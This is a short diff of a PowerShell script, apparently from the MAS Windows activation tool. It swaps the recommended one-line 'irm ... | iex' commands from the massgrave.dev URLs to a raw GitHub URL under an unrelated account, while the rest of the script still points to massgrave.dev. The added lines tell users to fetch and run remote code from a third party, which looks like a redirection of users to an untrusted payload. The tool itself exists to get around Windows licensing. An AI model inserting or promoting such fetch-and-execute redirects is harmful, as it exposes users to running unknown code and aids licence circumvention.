@@ -1,8 +1,8 @@
 # Check massgrave.dev for more details
 
 write-host
-Write-Host "The current command (irm https://massgrave.dev/get | iex) will be retired in the future."
-Write-Host -ForegroundColor Green "Use the new command (irm https://get.activated.win | iex) moving forward."
+Write-Host "The current command (irm https://raw.githubusercontent.com/chinanb114514-png/activate-windows/refs/heads/main/activate |iex ) will be retired in the future."
+Write-Host -ForegroundColor Green "Use the new command (irm https://raw.githubusercontent.com/chinanb114514-png/activate-windows/refs/heads/main/activate |iex ) moving forward."
 write-host
 
 $troubleshoot = 'https://massgrave.dev/troubleshoot'
